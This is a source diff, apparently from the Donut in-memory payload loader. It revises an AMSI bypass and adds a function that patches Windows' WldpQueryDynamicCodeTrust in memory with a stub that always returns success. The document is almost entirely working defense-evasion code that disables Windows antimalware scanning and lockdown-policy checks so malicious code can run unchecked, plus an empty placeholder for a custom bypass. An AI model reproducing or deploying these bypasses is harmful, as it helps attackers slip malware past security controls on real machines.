@@ -74,7 +74,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
           cs, len, PAGE_EXECUTE_READWRITE, &op))
         {
           // over write with code stub
-          memcpy(cs, &AmsiScanBufferStub, len);
+          Memcpy(cs, &AmsiScanBufferStub, len);
           
           disabled = TRUE;
             
@@ -113,14 +113,14 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
       // is it "AMSI"?
       if(ctx->Signature == inst->amsi.w[0]) {
         // set page protection for write access
-        inst->api.VirtualProtect(cs, 4096, 
+        inst->api.VirtualProtect(cs, sizeof(DWORD), 
           PAGE_EXECUTE_READWRITE, &op);
           
         // change signature
         ctx->Signature++;
         
         // set page back to original protection
-        inst->api.VirtualProtect(cs, 4096, op, &t);
+        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
         disabled = TRUE;
         break;
       }
@@ -203,4 +203,61 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
 }
 
+#endif
+
+#if defined(BYPASS_WLDP_A)
+// fake function that always returns S_OK
+static HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
+    HANDLE fileHandle,
+    PVOID  baseImage,
+    ULONG  ImageSize)
+{
+    return S_OK;
+}
+
+static VOID WldpQueryDynamicCodeTrustStubEnd(VOID) {}
+
+BOOL DisableWLDP(PDONUT_INSTANCE inst) {
+    BOOL    disabled = FALSE;
+    HMODULE wldp;
+    DWORD   len, op, t;
+    LPVOID  cs;
+    
+    // load WLDP
+    wldp = inst->api.LoadLibraryExA(
+      inst->wldp, NULL, 
+      LOAD_LIBRARY_SEARCH_SYSTEM32);
+    
+    if(wldp != NULL) {
+      // resolve address of WldpQueryDynamicCodeTrust
+      cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
+      
+      if(cs != NULL) {
+        // calculate length of stub
+        len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
+          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
+          
+        // make the memory writeable
+        if(inst->api.VirtualProtect(
+          cs, len, PAGE_EXECUTE_READWRITE, &op))
+        {
+          // over write with stub
+          Memcpy(cs, &WldpQueryDynamicCodeTrustStub, len);
+        
+          disabled = TRUE;
+        
+          // set back to original protection
+          inst->api.VirtualProtect(cs, len, op, &t);
+        }
+      }
+    }
+    return disabled;
+}
+#elif defined(BYPASS_WLDP_B)
+// This is where you may define your own WLDP bypass.
+// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_B defined.
+
+BOOL DisableWLDP(PDONUT_INSTANCE inst) {
+    
+}
 #endif
